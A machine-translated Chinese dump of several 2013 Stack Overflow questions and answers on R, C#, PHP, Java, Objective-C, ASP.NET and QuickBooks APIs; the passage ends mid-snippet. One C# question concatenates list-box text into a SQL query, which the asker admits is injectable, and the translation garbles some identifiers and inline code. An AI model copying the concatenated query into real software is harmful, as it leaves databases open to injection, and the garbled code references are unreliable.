> 时间：2013-04-02T19:05:47.700
> 
> 标签：r

假设我有以下代码：

```
ord_reg<- clm(as.factor(y)~log10(x), data=dataframe, link="probit") 
```

假设我想指定概率斜率为 1.2。这将是正确的代码：

```
ord_reg<- clm(as.factor(y)~log10(x)+offset(probit_slope=1.2), data=dataframe, link="probit") 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-02T19:12:57.677

您要为其修复参数的变量的名称是什么？让我们假设它是`x2`并且您想将参数修复为`1.2`

```
ord_reg<- clm(as.factor(y)~log10(x)+offset(x2*1.2), data=dataframe, link="probit") 
```

Ben Bolker 建议您修复 log10(x) 参数。在这种情况下，您将执行以下操作：

```
ord_reg<- clm(as.factor(y)~offset(log10(x)*1.2), data=dataframe, link="probit") 
```

# c# - 将 DataSet 转换为 String 或 Int

> ID：15772298
> 
> 赞同：1
> 
> 时间：2013-04-02T19:06:02.977
> 
> 标签：c#, sql, dataset

我有一个获取 SQL 命令并返回数据集的函数。现在我正在尝试运行这个字符串命令：

```
@"SELECT ProductPrice 
FROM Products 
Where ProductPrice IN 
(
  SELECT ProductPrice 
  FROM Products 
  WHERE  ProductName =N'" 

+ listBox1.Text 
+ "')").Tables[0].Rows[0].ToString() 
```

`ProductPrice`是一个`INT`
`ProductName`是一个`NVARCHAR`

我在文本框中得到了这个结果：

'系统.数据.数据行'

顺便说一句：这是一个学校项目！我知道这可能容易受到 SQL 注入的影响

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-02T19:11:07.927

由于这是一个家庭作业问题，我将坚持[家庭作业问题的指导方针，](https://meta.stackexchange.com/questions/10811/how-to-ask-and-answer-homework-questions)并尝试在不给你完整答案的情况下提供帮助。

> *   尝试提供能够引导提问者正确方向的解释。真正的理解是学生的真正目标，但尝试提供这种理解很少会因任何问题而受到赞赏。
> *   如果您认为它不会帮助学生，最好不要提供完整的代码示例，使用您的最佳判断。您可以先使用伪代码，并且本着创建编程资源的精神，您可以在适当的时间后返回并编辑您的响应以包含更完整的代码。这样，学生仍然需要编写自己的代码，但在作业结束后可以获得完整的解决方案。

* * *

首先，您的示例中缺少一些代码，但根据结果，我假设您的代码中有类似的内容：

```
TextboxResults.Text = MyTable.Rows[0].ToString(); 
```

您获得 System.Data.DataRow 的原因是您仅引用行（由数据适配器填充的表中的第一行），它是对象的集合。

提示：在您的 select 语句中，价格位于您已经引用的 Row**内（基于 0 的索引）的第一个元素中。**

较短的版本：您正在引用表格的第一行。您需要引用表格第一行中第一个单元格的内容。

由于成为一名优秀的开发人员通常意味着知道如何使用搜索，我会在谷歌上搜索以下短语并应用我刚刚告诉你的内容，你应该会得到答案：

*如何访问表格中特定数据行的单元格*

**第二个提示：**

如果我要***写入***第一行中第一个单元格的内容，它将如下所示：

```
myTable.Rows[0][0] = 1.99; 
```

代替

```
myTable.Rows[0] = 1.99; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-02T19:10:53.847

什穆利克，

我猜你尝试使用`dataRow.ToString()`. C# 不知道如何打印 DataRow 类型的对象，因为该对象可能包含不同的列。如果您想打印 ProductPrice，请尝试`dataRow[0].ToString()`。

# php - 为文本文件生成缩略图

> ID：15772299
> 
> 赞同：1
> 
> 时间：2013-04-02T19:06:06.667
> 
> 标签：php, ffmpeg, imagemagick, thumbnails

假设用户上传了一个 .txt 或 .php 文件，我想为其生成一个 .png 缩略图。有没有一种简单的方法，不需要我打开文件并将其内容写入新的.png？我有可用的 ImageMagick 和 FFmpeg，一定有办法利用它，但我一直在寻找，但还没有运气。

提前致谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2017-08-31T17:04:20.010

您可以使用`ffmpeg`：

```
 ffmpeg -video_size 640x480 -chars_per_frame 60000 -i in.txt -frames:v 1 out.png 
```

[![在此处输入图像描述](https://i.stack.imgur.com/Ejgf2.png)](https://i.stack.imgur.com/Ejgf2.png)

但是，它有一些警告：

*   默认情况下，它每帧渲染 6000 个字符，因此它可能不会绘制所有文本。`-chars_per_frame`您可以使用和/或`-framerate`输入选项更改此设置。默认帧速率为 25。

*   文本不会自动换行，因此您必须为文本添加换行符以适合您的输出视频大小。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-02T19:58:43.587

你总是可以使用 php 的[imagettftext](http://php.net/manual/en/function.imagettftext.php)函数。

它会给你一个文本文件中的内容的表示。

[http://php.net/manual/en/function.imagettftext.php](http://php.net/manual/en/function.imagettftext.php)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2019-02-17T22:10:02.770

```
$image = new Imagick();
$image->readImage("text:" . $filename . "[0]");
$image->resizeImage($width, $height, Imagick::FILTER_LANCZOS, 1);
$image->setImageFormat('png');
$image->writeImage($linkImage); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2016-08-06T09:29:35.670

您可以使用 PHP 的类`imagick`将文件转换为图像。它适用于 txt 文件。

```
try
{
   $im = new imagick("inputfile.txt[0]");
   if ($im)
   {
      $im->setImageAlphaChannel(imagick::ALPHACHANNEL_DEACTIVATE);
      $im->setImageFormat('jpg');
      $im->setImageCompressionQuality(85);
      file_put_contents("outfile.jpg",$im->getImageBlob());
   }
} catch(Exception $e)
{
    echo "cannot process";
}

// When imagick is unable to read the file, it may wrongly
// set internal server error 500 status code.
// I do not understand why that happens, because the script
// continues normally. Anyway, lets overwrite it here for all cases.
header("HTTP/1.1 200 OK"); 
```

# java - 有没有一种 DRY 方法来整合 RowMappers 的相同代码？

> ID：15772303
> 
> 赞同：4
> 
> 时间：2013-04-02T19:06:20.027
> 
> 标签：java, sql, jdbc, row

我正在使用 JDBC，我的许多类都有一个内部 RowMapper 类，如下所示：

```
public class Foo {
  class AppleRows implements RowMapper<Apple> {
    public Apple mapRow(ResultSet rs, int rowNum) throws SQLException {
      Apple a = new Apple();
      a.setName(rs.getString("Name"));
    }
  }

  class AppleRowsJoinedWithSomethingElse implements RowMapper<Apple> {
    public Apple mapRow(ResultSet rs, int rowNum) throws SQLException {
      Apple a = new Apple();   
      a.setName(rs.getString("Name"));
      a.setSomethingElse(rs.getString("SomethingElse"));
    } 
  }
} 
```

在上面的示例中，该行`a.setName(rs.getString("Name"))`被复制。这只是一个示例，但在我的实际代码中，有 10 多个这样的字段。我想知道是否有更好的方法来做到这一点？

注意：我需要不同的映射器，因为我在某些地方使用它们，我将结果与另一个表连接（获取更多字段）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-02T19:09:44.530

你可以`extend`+使用`super.mapRow()`...

```
public class Foo {
  class AppleRows implements RowMapper<Apple> {
    public Apple mapRow(ResultSet rs, int rowNum) throws SQLException {
      Apple a = new Apple();
      a.setName(rs.getString("Name"));
      return a;
    }
  }

  class AppleRowsJoinedWithSomethingElse extends AppleRows {
    public Apple mapRow(ResultSet rs, int rowNum) throws SQLException {
      Apple a = super.mapRow(rs, rowNum);
      a.setSomethingElse(rs.getString("SomethingElse"));
      return a;
    } 
  }
} 
```

或者简单地委托，如果你不喜欢使用继承作为代码重用的机制：

```
public class Foo {
  class AppleRows implements RowMapper<Apple> {
    public Apple mapRow(ResultSet rs, int rowNum) throws SQLException {
      Apple a = new Apple();
      a.setName(rs.getString("Name"));
      return a;
    }
  }

  class AppleRowsJoinedWithSomethingElse implements RowMapper<Apple> {
    public Apple mapRow(ResultSet rs, int rowNum) throws SQLException {
      Apple a = new AppleRows().mapRow(rs, rowNum);
      a.setSomethingElse(rs.getString("SomethingElse"));
      return a;
    } 
  }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-02T19:09:46.783

一种可能的方法是使用继承，特别是如果您可以将内部类变成`static`嵌套类，如下所示：

```
public class Foo {
  static class AppleRows implements RowMapper<Apple> {
    public Apple mapRow(ResultSet rs, int rowNum) throws SQLException {
      Apple a = new Apple();
      a.setName(rs.getString("Name"));
      return a;
    }
  }

  static class AppleRowsJoinedWithSomethingElse extends AppleRows {
    public Apple mapRow(ResultSet rs, int rowNum) throws SQLException {
      Apple a = super.mapRow(rs, rowNum);
      a.setSomethingElse(rs.getString("SomethingElse"));
      return a;
    } 
  }
} 
```

我在这里使用`static`嵌套类的原因是因为在未使用的非嵌套类中存在对包含类的实例的隐式引用`static`（至少在当前实现中）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-02T19:12:00.617

每个映射器映射单个行定义。我不会称这违反了 DRY。

在 的基础视图中更改单个列名称时`AppleRowsJoinedWithSomethingElse`，您只需在一个位置进行更改。

如果您使用通用代码对其进行重构，那么如果提供的视图`AppleRowsJoinedWithSomethingElse`发生更改，但底层`AppleRows`没有更改，您将处于一个奇怪的位置。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-02T19:36:34.567

无需扩展即可共享通用功能。我只是在输入这个，所以它实际上可能无法编译。

```
public class CommonBlammy
{
    private CommonBlammy() { } // private constructor to prevent instantiation.

    public static Apple mapRow(final ResultSet resultSet)
    throws SQLException
    {
        Apple returnValue = new Apple();

        returnValue.setName(resultSet.getString("Name"));

        return returnValue;
    }
}

public class AppleRows implements RowMapper
{
    public Apple mapRow(
        final ResultSet resultSet,
        final int rowNumber)
        throws SQLException
    {
      return CommonBlammy.mapRow(ResultSet resultSet);
    }
}

public class AppleRowsJoinedWithSomethingElse implements RowMapper
{
    public Apple mapRow(
        final ResultSet resultSet,
        final int rowNumber)
    throws SQLException
    {
        Apple returnValue;

        returnValue = CommonBlammy.mapRow(ResultSet resultSet);
        returnValue.setSomethingElse(rs.getString("SomethingElse"));

        return returnValue;
    } 
}
```

# cocos2d-iphone - 精灵数组的错误访问

> ID：15772306
> 
> 赞同：2
> 
> 时间：2013-04-02T19:06:41.813
> 
> 标签：cocos2d-iphone, nsmutablearray, exc-bad-access

我正在使用 CCSprites 填充 NSMutableArray 并将它们添加到添加到场景中的当前层。当我尝试访问数组的元素时，出现错误的访问错误

```
sprites = [[[NSMutableArray alloc] init]autorelease];

    int j = 0;

    for (int i=0; i<[sprites count]; i++)
    {
        j=i+1;
        sprite = [CCSprite spriteWithFile:[NSString stringWithFormat:@"intro%d.png",j]];
        sprite.position = ccp(WIDTH/2, HEIGHT/2+(i*HEIGHT));
        [sprites addObject:sprite];

    }

    for (int i = 0; i<[sprites count]; i++)
    {
        [self addChild:[sprites objectAtIndex:i]];
    }

    [self scheduleUpdate];

}
return self; 
```

这是在 init 方法中完成的，并且 sprites 和 sprite 在头文件中声明。在更新方法中，我有

```
sprite = [sprites objectAtIndex:1];
sprite.position = ccpAdd(sprite.position, ccp(0,dy));
CCSprite* spr = [sprites objectAtIndex:2];
spr.position = ccpAdd(spr.position, ccp(0,dy)); 
```

当控制权传递给更新方法时，我的访问权限不好。如果有人可以帮助我，我会很高兴

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T19:24:33.317

您应该保留 sprites 数组（确保在对象的 dealloc 中释放它）。由于它是可自动发布的，因此在从您的 init 到您的更新方法的周期中，它会被释放。

另外（奇怪），如果您的代码如图所示，当您开始第一个循环时， sprites.count 为 0。你不会在那里得到太多:)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-02T21:36:00.450

发生这种情况是因为您创建了一个自动释放对象，然后您尝试稍后在更新代码中访问该对象。sprites 数组的保留计数为零（因为它是自动释放的），并被释放，然后您尝试访问它，并获得错误访问错误。

要解决此问题，您不应*将*sprites 数组设为自动释放对象。由于您计划稍后在代码中使用该对象，因此您应该保留它（通过不添加自动释放）。然后，您还应该确保在（无论在数组上操作的父对象）的 dealloc 方法中释放数组。

```
- ( void ) dealloc {
   [ sprites release ];
   [ super dealloc ];
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-03T03:59:15.437

其他人是对的（`autorelease`调用是罪魁祸首 - 你应该删除它，然后在`dealloc`场景的方法中释放数组）。

另请注意，这与（但对于您的场景，这不是您所需要的）`[[[NSMutableArray alloc] init]autorelease]`具有相同的效果。`[NSMutableArray array]`

# c# - 在隐藏的 div 中选中的复选框

> ID：15772309
> 
> 赞同：0
> 
> 时间：2013-04-02T19:07:04.567
> 
> 标签：c#, asp.net, checkbox, checkboxlist

我在隐藏的 div 中有一个 C# Checkboxlist。div 在某些事件上显示，然后关闭。提交表单时，我尝试根据 checkboxlist.items 的选定值更新数据库位字段，但无论是否选中，它们总是返回 false。当包含项目的 div 被隐藏时，如何获取项目的选定值？

div 是我使用 jquery 显示/隐藏的对话框

```
 $(document).ready(function () {
        $('#<%=txtLANG.ClientID %>').click(function () {
            $("#overlay-back").dialog({
                resizable: false,
                modal: true,
                width: 500,
                height: 400,
                buttons: {
                    OK: function () {
                        GetLanguages();
                        $(this).dialog("close");
                    },
                    Cancel: function () {
                        $(this).dialog("close");
                    }
                }
            });
        });
    }); 
```

这是DIV ...代码隐藏只不过是根据复选框列表项的选定值将参数设置为真/假

```
<div id="overlay-back" style="display:none;">
        <table width="100%">
            <tr>
                <td width="50%">
                    <asp:CheckBox runat="server" ID="chkEnglish" TextAlign="Right" Text=" English" />
                    <div class="popup-container">
                            <img id="help_button_chkEnglish" class="help-button" src="/Images/help-button.png" alt="" />
                                <div class="help-popup hidden" id="help_popup_chkEnglish">
                                    <div class="popup-arrow-border"></div> <div class="popup-arrow"></div>
                                    <asp:Label runat="server" ID="lblLANGDesc"></asp:Label>
                                </div>
                        </div>
                </td>
                <asp:Panel runat="server" ID="pnlTopLanguages">
                <td rowspan="3" valign="top">
                    <asp:CheckBoxList ID="chkTopLanguages" TextAlign="Right" runat="server" />
                        <br />
                    <asp:Label runat="server" ID="lblNonTopLanguages"></asp:Label><br />
                    <asp:TextBox runat="server" ID="txtOtherLanguages" onkeypress="CopyOtherLangs(event)" onclick="clearLanguageSearchText()" Text="Other Languages..."></asp:TextBox>
                    <cc3:AutoCompleteExtender ID="aceSearch" runat="server" MinimumPrefixLength="1" TargetControlID="txtOtherLanguages"
                                                ServicePath="~/controls/wsCommunity.asmx" ServiceMethod="GetLanguageCompletionList">
                                        </cc3:AutoCompleteExtender>
                </td>
                <td rowspan="3">
                <div class="popup-container">
                            <img id="help_button_chkTopLanguages" class="help-button" src="/Images/help-button.png" alt="" />
                                <div class="help-popup hidden" id="help_popup_chkTopLanguages">
                                    <div class="popup-arrow-border"></div> <div class="popup-arrow"></div>
                                    <asp:Label runat="server" ID="lblTopLangs"></asp:Label>
                                </div>
                        </div>
                </td>
                </asp:Panel>
            </tr>
            <tr>
                <td>
                    <asp:CheckBox runat="server" ID="chkFrench" TextAlign="Right" Text=" French" />
                    <div class="popup-container">
                            <img id="help_button_chkFrench" class="help-button" src="/Images/help-button.png" alt="" />
                                <div class="help-popup hidden" id="help_popup_chkFrench">
                                    <div class="popup-arrow-border"></div> <div class="popup-arrow"></div>
                                    <asp:Label runat="server" ID="Label2"></asp:Label>
                                </div>
                        </div>
                </td>
            </tr>
            <asp:Panel runat="server" ID="pnlEnhancedFrench">
            <tr>
                <td valign="top">
                    <asp:CheckBoxList ID="chkEnhancedFrench" TextAlign="Right" CssClass="EnhancedFrench" runat="server">
                        <asp:ListItem> Customer Service</asp:ListItem>
                        <asp:ListItem> Publications</asp:ListItem>
                        <asp:ListItem> Website</asp:ListItem>
                        <asp:ListItem> Interpreters</asp:ListItem>
                    </asp:CheckBoxList>
                </td>
            </tr>
            </asp:Panel>
        </table>
        </div> 
```

# c# - 使用实现的抽象类的动作委托参数不匹配

> ID：15772310
> 
> 赞同：0
> 
> 时间：2013-04-02T19:07:09.833
> 
> 标签：c#, oop, delegates, polymorphism

我有以下抽象类：

```
public abstract class BaseClass{
    public object contents { get; set; }
    public Action<BaseClass> mutator;
    public abstract void Initialise();
} 
```

这将被几个类使用，这些类将覆盖`Initialize`为 分配值的方法，然后在特定时间点使用委托`contents`对其进行变异。`mutator`

我有以下静态类，每个方法都打算用作`mutator`：

```
public static class Mutators{
    public static void VariantA(A inputObj){
        // inputObj.contents = something else
    }

    public static void VariantB(A inputObj) { } // etc. etc.
} 
```

然后我有A类，它实现了BaseClass。我正在尝试将 Mutators.VariantA 分配给 mutator 代表，但我做不到。

```
public class A : BaseClass{
    public A(){
        mutator = Mutators.VariantA;
    }

    public override void Initialise(){
        /* set the value of contents property here */
    }
} 
```

具体来说，我收到以下错误：`A method or delegate`Mutators.VariantA(A)' parameters do not match delegate`System.Action<BaseClass>(BaseClass)' parameters (CS0123)`

我知道这`Mutators.VariantA(A)`需要一个类型的对象`A`，并且 Action 被声明为接受一个类型的输入`BaseClass`，但是作为类`A`实现`BaseClass`我认为我能够做到这一点？

来自动态类型语言，我很难掌握以这种方式处理类型的问题:(

有什么方法可以通过这种方式指向具有抽象类型输入的函数吗？我需要看看其他一些设计模式吗？

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-02T19:11:01.427

> 我知道 Mutators.VariantA(A) 需要 A 类型的对象，并且 Action 被声明为接受 BaseClass 类型的输入，但是当 A 类实现 BaseClass 时，我认为我能够做到这一点？

绝对不。

An`Action<BaseClass>`必须能够接受*任何* `BaseClass`对象。因此，例如，如果您的代码有效，我将能够编写：

```
Action<BaseClass> mutator = Mutators.VariantA;
mutator.Invoke(new B()); 
```

（从哪里`B`派生的另一个类`BaseClass`。）

`B`派生自的事实`BaseClass`使其对*调用*有效- 但它不会帮助您的`VariantA`方法很好地工作。

目前还不清楚为什么你在这里*有*一个突变体——我强烈怀疑你应该`BaseClass`从它的突变中抽象出来。我仍然没有遵循您想要实现的目标，但是这种设计模式不会帮助您以类型安全的方式实现目标。

你*可以*写：

```
public abstract class BaseClass<T> where T : BaseClass<T> {
    public object Contents { get; set; }
    public Action<T> Mutator { get; set; }
    public abstract void Initialise();
} 
```

... 然后：

```
public class A : BaseClass<A> {
    public A() {
        Mutator = Mutators.VariantA;
    }
} 
```

...那样你就会写一些可以改变“A”值的东西。但以我的经验，这种通用嵌套变得非常混乱，非常快。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-02T19:13:56.203

我已经使用了您当前的示例并将其中一个类的方法签名更改为以下内容，并且可以正常工作

```
 public abstract class BaseClass
    {
        public object contents { get; set; }
        public Action<BaseClass> mutator;
        public abstract void Initialise();
    }
    public static class Mutators
    {
        public static void VariantA(BaseClass baseClass)
        {
            // inputObj.contents = something else
        }

        public static void VariantB(A inputObj) { } // etc. etc.
    }
    public class A : BaseClass
    {
        public A()
        {
            mutator = Mutators.VariantA;
        }

        public override void Initialise()
        {
            /* set the value of contents property here */
        }
    } 
```

# iphone - 以编程方式添加 UITableView - 如何为单元格设置重用标识符？

> ID：15772311
> 
> 赞同：6
> 
> 时间：2013-04-02T19:07:14.793
> 
> 标签：iphone, ios, objective-c, uitableview, uiviewcontroller

我有一个 UIViewController，它在某些时候会增长一个 UITableView，当它发生时，我只需初始化 TableView 实例变量并将其添加到视图中，但我不确定如何处理单元格的出列以添加到视图中；我需要一个重用标识符，但我不知道如何设置它。

我在这个方法中做什么？

```
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath {
    static NSString *cellIdentifier = @"wot";

    UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:cellIdentifier forIndexPath:indexPath];

    return cell;
} 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-02T19:11:54.947

使用方法`initWithStyle:reuseIdentifier`

1.  检查是否`cell`存在
2.  如果没有，那么您需要初始化它。

代码

```
-(UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath (NSIndexPath*)indexPath 
{
    static NSString *cellIdentifier = @"wot";
    UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:cellIdentifier forIndexPath:indexPath];

    if (!cell)
        cell = [[UITableViewCell alloc] initWithStyle: someStyle reuseIdentifier: cellIdentifier];

    return cell;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-02T19:13:44.360

重用标识符不需要明确定义。在该`cellForRowAtIndexPath`方法中，您所包含的定义足以使用

供[参考](http://developer.apple.com/library/ios/#documentation/userexperience/conceptual/TableView_iPhone/CreateConfigureTableView/CreateConfigureTableView.html#//apple_ref/doc/uid/TP40007451-CH6-SW4)

例如

```
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath {
    static NSString *MyIdentifier = @"MyReuseIdentifier";
    UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:MyIdentifier];
    if (cell == nil) {
        cell = [[[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault  reuseIdentifier:MyIdentifier]];
    }
    Region *region = [regions objectAtIndex:indexPath.section];
    TimeZoneWrapper *timeZoneWrapper = [region.timeZoneWrappers objectAtIndex:indexPath.row];
    cell.textLabel.text = timeZoneWrapper.localeName;
    return cell;
} 
```

# asp.net - 计时器方法滴答后页面中缺少控件

> ID：15772316
> 
> 赞同：0
> 
> 时间：2013-04-02T19:07:41.633
> 
> 标签：asp.net, timer, request.form

我有一些处理计时器方法的代码，它只是更新标签并将其更改为此时的最后更新。

```
Protected Sub specialNotesTimer_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles specialNotesTimer.Tick
    Label1.Text = "Panel refreshed at: " + DateTime.Now.ToLongTimeString()
End Sub 
```

但是，当它滴答作响时，无法通过按下按钮找到页面上的任何其他控件。缺少图像按钮或我的其他动态创建的控件，我们就是这种情况。我有一个函数可以在页面上找到触发的控件，然后返回控件，以便我可以确定要做什么

```
Public Shared Function GetPostBackControl(ByVal thePage As Page) As Control
    Dim myControl As Control = Nothing
    Dim ctrlName As String = thePage.Request.Params.Get("__EVENTTARGET")
    If ((ctrlName IsNot Nothing) And (ctrlName <> String.Empty)) Then
        myControl = thePage.FindControl(ctrlName)
    Else
        For Each Item As String In thePage.Request.Form
            Dim c As Control = thePage.FindControl(Item)
            If (TypeOf (c) Is System.Web.UI.WebControls.Button) Then
                 myControl = c
            End If
        Next

    End If
    Return myControl
End Function 
```

这在 timer.tick 之前有效，但在之后无效。该控件不会在 Page.Request.Form 中列为项目，并且当我知道该控件存在时，它会抛出一个空异常。

# quickbooks - 当交易日期已过时，无法通过 IPP 向 Quickbooks 发送订单

> ID：15772318
> 
> 赞同：1
> 
> 时间：2013-04-02T19:07:48.353
> 
> 标签：quickbooks, intuit-partner-platform

我已经编辑了这个问题，使其更加清晰和集中，因为我已经进行了更多调查。

同步订单适用于今天和未来的日期，但不适用于过去的日期。我现在直接在 API Explorer 中进行测试。

这是添加订单请求和响应：

```
<!--Add order request-->
<Add xmlns="http://www.intuit.com/sb/cdm/v2" 
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
    RequestId="ecc53f53d70f0a52de4c88021721ba32" 
    xsi:schemaLocation="http://www.intuit.com/sb/cdm/v2 ./RestDataFilter.xsd ">
    <OfferingId>ipp</OfferingId>
    <ExternalRealmId>688875295</ExternalRealmId>
    <Object xsi:type="SalesOrder">
        <Header>
            <DocNumber>6</DocNumber>
            <TxnDate>2010-12-25</TxnDate>
            <CustomerId idDomain="QB">4</CustomerId>
            <SalesRepId idDomain="QB">1</SalesRepId>
        </Header>
        <Line>
            <ItemId idDomain="QB">1</ItemId>
            <Qty>6</Qty>
        </Line>
    </Object>
</Add>

<!--Add order response-->
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<RestResponse xmlns="http://www.intuit.com/sb/cdm/v2">
    <Success RequestId="ecc53f53d70f0a52de4c88021721ba32">
        <ObjectRef>
            <Id idDomain="NG">802721</Id>
            <SyncToken>1</SyncToken>
            <LastUpdatedTime>2013-04-29T15:26:53Z</LastUpdatedTime>
        </ObjectRef>
        <RequestName>SalesOrderAdd</RequestName>
        <ProcessedTime>2013-04-29T15:26:53Z</ProcessedTime>
    </Success>
</RestResponse> 
```

这是同步状态和同步活动。SalesOrder 只有一个实体，但时间不匹配，所以我不相信它引用了我通过 API 资源管理器添加的相同订单。另外，我添加的订单也没有出现在 Quickbooks 中。

```
<SyncStatusResponse>
<NgIdSet>
<NgId>802721</NgId>
<NgObjectType>SalesOrder</NgObjectType>
</NgIdSet>
<RequestId>DB7F4BF877006079E040900A0F1B14C1</RequestId>
<StateCode>8</StateCode>
<StateDesc>Record netted with QB</StateDesc>
<MessageCode>70</MessageCode>
<MessageDesc>MBL Netter success using QB SDK ext_ack_id</MessageDesc>
<ResponseLogTMS>2013-04-29T15:38:02.0Z</ResponseLogTMS>
</SyncStatusResponse>

<SyncActivityResponse>
<SyncType>Writeback</SyncType>
<StartSyncTMS>2013-04-10T12:42:21.0</StartSyncTMS>
<EndSyncTMS>2013-04-29T08:38:02.0</EndSyncTMS>
<EntityName>SalesOrder</EntityName>
<EntityRowCount>20</EntityRowCount>
</SyncActivityResponse> 
```

从同步状态响应来看，状态码 8 表示

> 记录净额。同步。在数据服务中创建的对象。Sync Manager 已确认同步对象并将其 NG ID 映射到 QuickBooks 中的 QB ID。等效于 StateCode 1（用于在 QuickBooks 中创建的对象）。

消息代码 70 根据其描述似乎没问题，但未在[文档](http://docs.developer.intuit.com/0025_Intuit_Anywhere/0050_Data_Services/v2/0500_QuickBooks_Windows/0600_Object_Reference/SyncStatus)中列出。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-04T17:31:59.883

因此，您的请求成功，但运行同步后您在 QuickKBooks 中看不到它。检查对象的同步状态，也可以通过调用这些 API 来查看所有同步活动

[http://docs.developer.intuit.com/0025_Intuit_Anywhere/0050_Data_Services/v2/0500_QuickBooks_Windows/0600_Object_Reference/SyncActivity](http://docs.developer.intuit.com/0025_Intuit_Anywhere/0050_Data_Services/v2/0500_QuickBooks_Windows/0600_Object_Reference/SyncActivity)

[http://docs.developer.intuit.com/0025_Intuit_Anywhere/0050_Data_Services/v2/0500_QuickBooks_Windows/0600_Object_Reference/SyncStatus](http://docs.developer.intuit.com/0025_Intuit_Anywhere/0050_Data_Services/v2/0500_QuickBooks_Windows/0600_Object_Reference/SyncStatus)

即使您的请求成功，在它可以同步到 QuickBooks 之前，它必须通过要在桌面上创建/更新的业务规则。

如果您的对象遇到错误（假设它是重复的），那么您也可以在查询中添加错误对象过滤器来查询它。

问候
贾里德

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-05-01T15:52:19.697

在 Quickbooks Destop 中，默认情况下仅显示当前会计年度交易。您可以尝试将日期过滤器更改为“全部”，以查看销售订单是否成功？

# sql - 使用 REST API 的 Linq to SQL？

> ID：15772321
> 
> 赞同：3
> 
> 时间：2013-04-02T19:08:10.350
> 
> 标签：sql, linq, api, rest, linq-to-sql

我想使用旧数据库设置 REST API。我正在研究 LINQ to SQL 作为数据库和 REST API 之间的通信器的选项。操作顺序如下：客户端向 REST API 请求数据，REST API 接收“GET”请求，调用 LINQ to SQL 方法获取请求的对象，对象以 JSON 格式返回给客户端进行客户端处理。我喜欢 LINQ to SQL，因为它可以获取数据表并输出 C# 对象。

大多数请求将是“GET”；但是，将来会添加“POST”和“PUT”。

这是合理的，还是我应该寻找不同的方法？我是一个新开发者，所以请原谅我的无知！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T13:30:34.943

您使用的特定技术只是帮助您实现目标的工具。一个达到目的的手段。该目标通常是解决一些业务问题。以健壮、灵活和易于扩展的方式这样做也很好，以便在最短的时间内提供最大可能的业务价值。

如果要分析您问题的某个方面，使用 LINQ to SQL 就可以了。但是，有许多 ORM 解决方案可以实现类似的结果（nHibernate、Entity Framework、ADO.NET）。他们都可以实现解决业务问题的目标。

要记住的重要一点是，您为实施选择的特定技术通常不如您如何实施解决方案重要。好代码和坏代码独立于编写它们的技术。

总之，您在问题中列出的技术都是优秀的技术，如果使用得当，可以提供强大、灵活且易于扩展的解决方案。

# php - 使用 Ajax 过滤表格 - 下拉选择 - php

> ID：15772323
> 
> 赞同：0
> 
> 时间：2013-04-02T19:08:32.493
> 
> 标签：php, jquery, mysql, ajax, json

在另一篇文章中，我获得了一些关于使用 AJAX 动态创建下拉菜单的帮助。

我有一个表，它显示（在 HTML 表中）mySQL 表中包含的所有信息 - 上面有 3 个与表的特定行相关的下拉列表。现在，我正在尝试使用从下拉列表中选择的数据来“刷新”表格（即，如果用户选择下拉列表 - 表格会刷新显示由他们的选择过滤的数据）。

我的 client.php 看起来像这样（这是用户加载的内容）：

```
<script id="source" language="javascript" type="text/javascript">
  $(function () 
  {
    //-----------------------------------------------------------------------
    //SEND HTTP REQUEST WITH AJAX INITIALLY
    //-----------------------------------------------------------------------
    $.ajax({                                      
        url: 'api.php',   //the script to call to get data          
        data: "",   //insert url argumnets here to pass to api.php for example "id=5&parent=6"
        dataType: 'json',   //data format      
        success: function(response) //on recieve of reply     
        { //Do the following on Success 

            //Set the filtering for "Creative"
            var creatives = response.CREATIVE;
            for (var i in creatives)
            {
                var creative = creatives[i];
                var creativeID = creative[0];
                $('#creative-select').append("<option value=\""+creativeID+"\">"+creativeID+"</option>");
            }

            //Set the filtering for "Stations"
            var stations = response.STATION_NETWORK;
            for (var i in stations)
            {
                var station = stations[i];
                var stationID = station[0];
                $('#station-select').append("<option value=\""+stationID+"\">"+stationID+"</option>");
            }

            //Set the filtering for "Verticals"
            var verticals = response.VERTICAL;
            for (var i in verticals)
            {
                var vertical = verticals[i];
                var vertID = vertical[0];
                $('#vertical-select').append("<option value=\""+vertID+"\">"+vertID+"</option>");
            }

            //Set the Table Content  Initially
            var rows = response.rowdata;
            for (var i in rows)
            {
                var row = rows[i];
                var id = row[0];              //get id
                var station_network = row[1];       //get name
                var vertical = row[2];  //get vertical
                var creative = row[3]; //get creative
                var tolls= row[4];  //get tolls
                var states= row[5];  //get states
                var date_range= row[6];  //get date_range
                var week= row[7];  //get week
                var ordered= row[8];  //get ordered
                var credits= row[9];  //get credits
